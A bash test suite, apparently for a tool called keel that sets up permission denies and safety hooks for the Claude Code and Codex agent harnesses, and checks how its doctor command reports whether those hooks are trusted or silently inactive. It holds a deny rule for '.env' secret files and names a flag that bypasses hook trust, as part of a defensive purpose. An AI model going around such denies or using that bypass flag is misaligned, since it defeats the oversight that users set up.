[ -f "$w/CLAUDE.md" ] && bad "no CLAUDE.md for a codex-only repo" "written" \
  || ok "no CLAUDE.md for a codex-only repo"

# The five path denies port and get stronger. A path deny also stops `cat`.
n="$(grep -c 'deny' "$w/.codex/config.toml" 2>/dev/null || echo 0)"
[ "$n" -ge 5 ] && ok "path denies written ($n)" || bad "path denies written" "got $n, wanted at least 5"

# Codex has no command-pattern rule syntax and no ask. Neither may be faked. A rule that looks like
# a prompt and is not one is the failure this whole design exists to prevent.
grep -qE 'Bash\(|"ask"|prompt' "$w/.codex/config.toml" 2>/dev/null \
  && bad "no command-pattern or ask rule is faked" "$(grep -nE 'Bash\(|"ask"|prompt' "$w/.codex/config.toml" | head -1)" \
  || ok "no command-pattern or ask rule is faked"

# Open question 6 of the architecture. Codex runs no hook until its source is trusted and says
# nothing when it skips one, so an install that says nothing leaves every gate silently dark. keel
# cannot grant that trust: it lives in the user's own config, not in this repository. What it can do
# is say so, and a message nothing pins is a message the next refactor deletes.
grep -qi 'trust' "$w/init.txt" 2>/dev/null && ok "init tells a Codex user about the hook trust step" \
  || bad "init tells a Codex user about the hook trust step" "no mention of trust in the init output"
grep -q 'dangerously-bypass-hook-trust' "$w/init.txt" 2>/dev/null \
  && bad "the bypass flag is not offered to a user" "init output names it" \
  || ok "the bypass flag is not offered to a user"
rm -rf "$w"

# A repository serving BOTH gets both, and this is the case a "last harness sourced wins" design
# passes for one harness and silently fails for the other.
w="$(mktemp -d)"; ( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )
if [ -f "$w/.codex/config.toml" ] && [ -f "$w/.claude/settings.json" ] \
   && [ -f "$w/CLAUDE.md" ] && [ -f "$w/AGENTS.md" ]; then
    ok "a repository serving both harnesses gets both configurations"
else
    bad "a repository serving both harnesses gets both configurations" \
      "codex=$([ -f "$w/.codex/config.toml" ] && echo y || echo n) claude=$([ -f "$w/.claude/settings.json" ] && echo y || echo n) CLAUDE.md=$([ -f "$w/CLAUDE.md" ] && echo y || echo n)"
fi
rm -rf "$w"


# --- The harness section in `keel doctor` ------------------------------------------------------
#
# ADR-0004: a guarantee is a property of (repository, harness). Doctor is the one place somebody
# asks what THEY get, so it answers for the harness in front of them and names what the others do
# not get.
#
# THE MANIFEST ANSWERS WHAT A HARNESS CAN DO. DOCTOR ANSWERS WHAT THIS INSTALLATION DOES. The two
# differ on Codex, which runs no hook until its source is trusted and says nothing when it skips
# one, so `harness_active_gates codex` is a true statement about Codex and a false one about a user
# whose hooks are untrusted. Doctor reporting the manifest's answer there would be keel agreeing
# with itself, which is the fault this plan has been bitten by twice.
#
# CODEX_HOME is set on every case below, and that is not tidiness. Unset, the trust reader falls
# back to the developer's own ~/.codex/config.toml and the verdict becomes a property of whoever is
# running the suite.
trust_home() {   # trust_home <state>; prints a CODEX_HOME holding a config in that state
    local state="$1" d; d="$(mktemp -d)"
    case "$state" in
        # What the 2026-09-06 probe actually wrote: the plugin enabled, and no trust entry of any
        # kind. The absence of trusted_hash is the whole signal.
        untrusted) printf '[plugins."keel@gbi"]\nenabled = true\n' > "$d/config.toml" ;;
        trusted)   printf '[plugins."keel@gbi"]\nenabled = true\n\n[hooks.state."keel@gbi"]\nenabled = true\ntrusted_hash = "9f2c"\n' > "$d/config.toml" ;;
        disabled)  printf '[plugins."keel@gbi"]\nenabled = true\n\n[hooks.state."keel@gbi"]\nenabled = false\ntrusted_hash = "9f2c"\n' > "$d/config.toml" ;;
        # A config that exists and says nothing about keel. Not proof of anything: what that machine
        # needs is the plugin installed, not the hooks trusted, so it must not read as dark. It
        # carries a trusted_hash in an UNRELATED table on purpose. `enabled` and `trusted_hash` are
        # ordinary field names, and a reader that grepped for either without asking which table it
        # sat in would call this machine trusted.
        stranger)  printf '[projects."/tmp/x"]\ntrust_level = "trusted"\ntrusted_hash = "9f2c"\n' > "$d/config.toml" ;;
        # keel installed and NOT trusted, beside a different plugin the user did trust. This is the
        # fail-open direction: read across every table rather than keel's own, a stranger's
        # trusted_hash answers for keel and doctor calls three gates active on a machine where none
        # of them will ever run. Found in review, not by the sweep, because every fixture above
        # holds exactly one plugin.
        foreign_trusted) printf '[plugins."keel@gbi"]\nenabled = true\n\n[hooks.state."other@market"]\nenabled = true\ntrusted_hash = "deadbeef"\n' > "$d/config.toml" ;;
        # And the other direction, which only cries wolf: keel trusted beside a plugin the user
        # turned off.
        foreign_disabled) printf '[plugins."keel@gbi"]\nenabled = true\n\n[hooks.state."keel@gbi"]\nenabled = true\ntrusted_hash = "9f2c"\n\n[plugins."other@market"]\nenabled = false\n' > "$d/config.toml" ;;
        absent)    : ;;
    esac
    printf '%s' "$d"
}

w="$(mktemp -d)"; ( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 \
  && python3 - .keel/profile.json <<'PY'
import json,sys
p=sys.argv[1]; d=json.load(open(p)); d["hard_block_paths"]=["src/auth/**"]
json.dump(d, open(p,"w"), indent=2)
PY
)

th_trusted="$(trust_home trusted)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
# The plan's text greps for `codex` anywhere in the output, which the gate list and the
# installed-here warning both satisfy whatever the detector answered. Pin the sentence instead.
printf '%s' "$out" | grep -q 'running under codex' && ok "doctor names the running harness" \
  || bad "doctor names the running harness" "no 'running under codex' line"
printf '%s' "$out" | grep -qi 'sensitive-guard' && ok "doctor reports the missing gate" \
  || bad "doctor reports the missing gate" "no mention of sensitive-guard"
printf '%s' "$out" | grep -qi 'hard_block_paths' && ok "doctor warns on an unenforceable hard block" \
  || bad "doctor warns on an unenforceable hard block" "no warning"

# Both signals unset. CLAUDECODE=1 is exported by Claude Code, and this repository is developed
# inside it, so `env -u CODEX_VERSION` alone would leave the detector confidently answering
# "claude" locally and "unknown" in CI. Verified set in the development environment before writing
# this case.
out="$( cd "$w" && env -u CODEX_VERSION -u CLAUDECODE CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'cannot determine' && ok "doctor says when it cannot tell" \
  || bad "doctor says when it cannot tell" "no such line"

# The acceptance case the plan names: the manifest grants the gate, the trust state withholds it,
# and doctor says dark. Without this case the whole trust reader is a comment.
#
# The failure it describes is not "nothing works". The same probe found the 25 skills load without
# trust and the hooks do not, so an untrusted install looks like most of keel working. That is why
# doctor must not also print the manifest's "gates active" line here: two lines, one saying the
# gates are live and one saying they are dark, is worse than either alone.
th_untrusted="$(trust_home untrusted)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_untrusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'dark' && ok "doctor reports an untrusted hook as a dark gate" \
  || bad "doctor reports an untrusted hook as a dark gate" "no dark line for an untrusted install"
printf '%s' "$out" | grep -qi 'codex gates active' \
  && bad "doctor does not also call the dark gates active" "both lines printed" \
  || ok "doctor does not also call the dark gates active"

# Trusted and disabled are different states with the same consequence, and only the first is safe
# to report as live.
th_disabled="$(trust_home disabled)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_disabled" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'dark' && ok "doctor reports a disabled hook as a dark gate" \
  || bad "doctor reports a disabled hook as a dark gate" "a disabled hook was reported as live"

out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'codex gates active' && ok "doctor reports a trusted install's gates as active" \
  || bad "doctor reports a trusted install's gates as active" "no gates active line"
printf '%s' "$out" | grep -qi 'dark' \
  && bad "doctor does not cry dark on a trusted install" "$(printf '%s' "$out" | grep -i dark | head -1)" \
  || ok "doctor does not cry dark on a trusted install"

# Absent or unreadable Codex config is not proof of anything. The manifest fails closed on missing
# evidence because a wrong `provides` row is unsafe; a doctor line that cries wolf on every machine
# gets ignored, which costs more than it saves.
th_absent="$(trust_home absent)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_absent" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'cannot tell' && ok "doctor says trust could not be determined" \
  || bad "doctor says trust could not be determined" "no such line"
printf '%s' "$out" | grep -qi 'dark' \
  && bad "an unreadable Codex config is not reported as dark" "$(printf '%s' "$out" | grep -i dark | head -1)" \
  || ok "an unreadable Codex config is not reported as dark"

th_stranger="$(trust_home stranger)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_stranger" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'dark' \
  && bad "a Codex config that never mentions keel is not reported as dark" "$(printf '%s' "$out" | grep -i dark | head -1)" \
  || ok "a Codex config that never mentions keel is not reported as dark"
printf '%s' "$out" | grep -qi 'codex gates active' \
  && bad "a trusted_hash in an unrelated table does not grant trust" "the gates were reported active" \
  || ok "a trusted_hash in an unrelated table does not grant trust"

th_foreign_t="$(trust_home foreign_trusted)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_foreign_t" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'dark' && ok "another plugin's trust does not make keel's hooks trusted" \
  || bad "another plugin's trust does not make keel's hooks trusted" "keel read as trusted on a stranger's trusted_hash"

th_foreign_d="$(trust_home foreign_disabled)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_foreign_d" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'codex gates active' && ok "another plugin being disabled does not darken keel's gates" \
  || bad "another plugin being disabled does not darken keel's gates" "keel read as untrusted because a stranger was disabled"

# HOME unset, which a container or a cron shell does. bin/keel runs under `set -u`, and the trust
# reader is called inside a command substitution: a bare `$HOME` there kills the SUBSHELL, leaves
# the verdict empty, and doctor falls through to "gates active" on a machine whose config it never
# read. That is silent and it fails open, so the case asserts the answer and not merely survival.
out="$( cd "$w" && env -u HOME -u CODEX_HOME CODEX_VERSION=0.153.4 "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'cannot tell' && ok "an unset HOME reads as unknown, not as trusted" \
  || bad "an unset HOME reads as unknown, not as trusted" "${out:0:120}"

# A harness installed on this machine that the repository does not list. A machine fact, so it
# belongs in doctor and never in init, which writes a committed team fact.
v="$(mktemp -d)"; ( cd "$v" && git init -q -b main . && "$ROOT/bin/keel" init --harness claude -y >/dev/null 2>&1 )
bindir="$(mktemp -d)"; printf '#!/bin/sh\nexit 0\n' > "$bindir/codex"; chmod +x "$bindir/codex"
out="$( cd "$v" && env -u CODEX_VERSION -u CLAUDECODE PATH="$bindir:$PATH" CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'installed on this machine' && ok "doctor names a harness installed here that the repository omits" \
  || bad "doctor names a harness installed here that the repository omits" "no such line"
# The same stub, a repository that lists codex: no warning.
v2="$(mktemp -d)"; ( cd "$v2" && git init -q -b main . && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )
out="$( cd "$v2" && env -u CODEX_VERSION -u CLAUDECODE PATH="$bindir:$PATH" CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'installed on this machine' \
  && bad "doctor stays quiet about a harness the repository lists" "${out:0:120}" \
  || ok "doctor stays quiet about a harness the repository lists"
rm -rf "$v2"
rm -rf "$bindir"

# The two context window messages were Claude Code numbers. A Codex rollout states its own window,
# `model_context_window`, 258400 on the probed session, so on Codex "assuming 200000" and "below the
# 200000 default" both name a baseline that is not the one in force.
python3 - "$v" <<'PY5'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
del d["gates"]["context_window"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY5
out="$( cd "$v" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -q 'model_context_window' && ok "doctor names the window Codex states, not one it assumes" \
  || bad "doctor names the window Codex states, not one it assumes" "no mention of model_context_window"
printf '%s' "$out" | grep -q 'window assumed 200000' \
  && bad "doctor does not tell a Codex user the window is assumed 200000" "the Claude Code sentence is still printed" \
  || ok "doctor does not tell a Codex user the window is assumed 200000"

# R-01: the Claude Code sentence is unchanged. Nothing about this task may alter what a Claude Code
# user reads, and the branch above is the one place it could have.
out="$( cd "$v" && env -u CODEX_VERSION CLAUDECODE=1 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -q 'window assumed 200000' && ok "the Claude Code window sentence is unchanged" \
  || bad "the Claude Code window sentence is unchanged" "the 200000 sentence stopped being printed under Claude Code"

# The floor message, the second of the two. A value below the floor never takes effect on either
# harness; naming 200000 as the baseline it is below is what is wrong on Codex.
python3 - "$v" <<'PY6'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d.setdefault("gates",{})["context_window"]=50000
p.write_text(json.dumps(d,indent=2)+"\n")
PY6
out="$( cd "$v" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -q 'below the 200000 default' \
  && bad "doctor does not name 200000 as the Codex baseline" "the Claude Code floor sentence is still printed" \
  || ok "doctor does not name 200000 as the Codex baseline"
printf '%s' "$out" | grep -q '50000' && ok "doctor still names the floor a Codex user set" \
  || bad "doctor still names the floor a Codex user set" "the configured 50000 went unmentioned"
out="$( cd "$v" && env -u CODEX_VERSION CLAUDECODE=1 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -q 'below the 200000 default' && ok "the Claude Code floor sentence is unchanged" \
  || bad "the Claude Code floor sentence is unchanged" "the floor sentence stopped being printed under Claude Code"

rm -rf "$w" "$v" "$th_trusted" "$th_untrusted" "$th_disabled" "$th_absent" "$th_stranger" \
       "$th_foreign_t" "$th_foreign_d"


# --- init must not destroy a Codex configuration it did not write --------------------------------
#
# `keel init` is documented as re-runnable and cmd_new calls the same path. The Claude writer
# branches on an existing settings.json and merges into it; the Codex writer truncated. Worse, a
# TRACKED .codex/config.toml is the only signal harness_set_for_repo uses to decide a repository
# serves Codex, so the file that opts a team in was the file the next init destroyed, taking their
# model choice, MCP servers and their own permission profiles with it.
w="$(mktemp -d)"
# The identity is load bearing here, not boilerplate: the commit below is what makes
# .codex/config.toml a TRACKED file, which is the only signal harness_set_for_repo reads. On a
# machine with no global user.name the commit fails, init never runs, and this reads as keel
# dropping its own table from a config it never saw.
( cd "$w" && git init -q -b main . && git config user.email t@t.t && git config user.name t \
  && mkdir -p .codex && cat > .codex/config.toml <<'TOML'
model = "gpt-5-codex"

[mcp_servers.internal]
command = "node"

[permissions.team.filesystem.":workspace_roots"]
"vendor/**" = "read"
TOML
git add -A && git commit -qm x && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )

for keep in 'model = "gpt-5-codex"' '[mcp_servers.internal]' '[permissions.team.filesystem' '"vendor/**" = "read"'; do
    grep -qF "$keep" "$w/.codex/config.toml" \
      && ok "init preserves an existing codex config: $keep" \
      || bad "init preserves an existing codex config: $keep" "gone after init"
done
grep -qF '"**/.env" = "deny"' "$w/.codex/config.toml" \
  && ok "init still adds keel's denies to an existing codex config" \
  || bad "init still adds keel's denies to an existing codex config" "keel's own table is missing"

# Idempotent. Re-running must not append a second copy of keel's table, which is how a managed
# block turns into a file that grows by one block per init.
( cd "$w" && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )
n="$(grep -c '\[permissions.keel.filesystem' "$w/.codex/config.toml")"
[ "$n" = 1 ] && ok "re-running init leaves one keel table, not two" \
  || bad "re-running init leaves one keel table, not two" "found $n"
n="$(grep -c 'model = "gpt-5-codex"' "$w/.codex/config.toml")"
[ "$n" = 1 ] && ok "re-running init does not duplicate the team's own keys" \
  || bad "re-running init does not duplicate the team's own keys" "found $n"

# A rule keel drops has to leave, or the managed region only ever grows. The whole region is
# replaced rather than merged into, which is what makes that true.
python3 - "$w/.codex/config.toml" <<'PY'
import sys
p = sys.argv[1]
t = open(p).read().replace('"**/.env" = "deny"', '"**/gone-from-keel" = "deny"')
open(p, "w").write(t)
PY
( cd "$w" && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )
grep -qF '"**/gone-from-keel" = "deny"' "$w/.codex/config.toml" \
  && bad "a rule keel no longer writes is removed from its own table" "the stale rule survived" \
  || ok "a rule keel no longer writes is removed from its own table"
rm -rf "$w"

# --- every harness's context file, not whichever was sourced last --------------------------------
#
# The rule this file states at `bin/keel#makes the loaded harness whichever ran last` is that nothing outside a harness_each call may assume
# which harness is loaded. referenced_docs_findings called harness_context_file bare, so it scanned
# whatever happened to be loaded last. Benign only while codex.sh returns nothing; a harness that
# returns a context file would have had its links silently unchecked.
grep -n 'harness_context_file' "$ROOT/bin/keel" | grep -v 'harness_each harness_context_file' \
  | sed 's/^[0-9]*://' | grep -vE '^[[:space:]]*#' | grep -q 'harness_context_file' \
  && bad "every harness_context_file call goes through harness_each" \
       "$(grep -n 'harness_context_file' "$ROOT/bin/keel" | grep -v 'harness_each harness_context_file' | grep -vE ':[[:space:]]*#' | head -1)" \
  || ok "every harness_context_file call goes through harness_each"


# --- the six keys nothing could honour -----------------------------------------------------------
#
# Six keys were retired because nothing could honour them, and init must stop writing the five it
# writes. A profile that still carries them is not broken; it is stale, and doctor's version
# comparison says so. What this pins is init writing a key the schema no longer declares, which is
# the silent half: `tests/validate-skills.sh#A key with no description is a key a reader cannot act on` records that the fingerprint checks the schema
# document and not what write_profile emits, so nothing else compares the two.
#
# READ THE SUBTREE, NOT THE FILE. A bare grep for "observability" matches the top-level
# "observability" object init also writes at bin/keel#"observability": { "backend": "signoz", so a gates.observability case would fail
# forever against a correct implementation. "review" has the same trap inside
# "code-review@claude-plugins-official" in plugins.recommended. Parse the JSON and look in the one
# place the key would be.
wr="$(fixture node-ts)"
( cd "$wr" && "$KEEL" init -y >/dev/null 2>&1 )
left="$( python3 - "$wr/.keel/profile.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
gone = [("gates", k) for k in ("tdd", "review", "observability", "docs_updated")]
gone += [("conventions", "working_branch"), ("observability", "log_shipping")]
print(" ".join("%s.%s" % (p, k) for p, k in gone if k in (d.get(p) or {})))
PY
)"
[ -z "$left" ] && ok "init writes none of the six retired keys" \
  || bad "init writes none of the six retired keys" "still written: $left"

sv="$(python3 -c "import json;print(json.load(open('$wr/.keel/profile.json'))['schema_version'])")"
# 6 since 2026-10-16: docs/plans/2026-10-16-manage-test-speed.md task 1 declared
# verify.test_affected and gates.suite_warn_seconds. A literal stays here on purpose, unlike the
# harness case above: this is the tripwire that makes a schema bump a deliberate act with a reason
# in the commit.
[ "$sv" = "6" ] && ok "init writes schema version 6" \
  || bad "init writes schema version 6" "got $sv"

# The floor for the first case. What it covers is a profile that parses but carries a gates object
# missing keys: that would satisfy "none of the six are present" while breaking every gate that
# survived, so the five survivors are named here rather than counted. It is not a floor for a
# missing or unparseable profile. This file runs without set -e, so on one of those both heredoc
# python3 calls die with empty stdout, left and kept are both empty, and cases 1 and 3 both report
# PASS. The schema version case above is what catches that, because sv comes back empty and the
# comparison against 4 fails.
kept="$( python3 - "$wr/.keel/profile.json" <<'PY'
import json, sys
g = json.load(open(sys.argv[1])).get("gates") or {}
print(" ".join(k for k in ("coding_standards", "security_audit", "commit_guard",
                           "done_verified", "context_window") if k not in g))
PY
)"
[ -z "$kept" ] && ok "init still writes the five gates that survive" \
  || bad "init still writes the five gates that survive" "missing: $kept"
rm -rf "$wr"

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
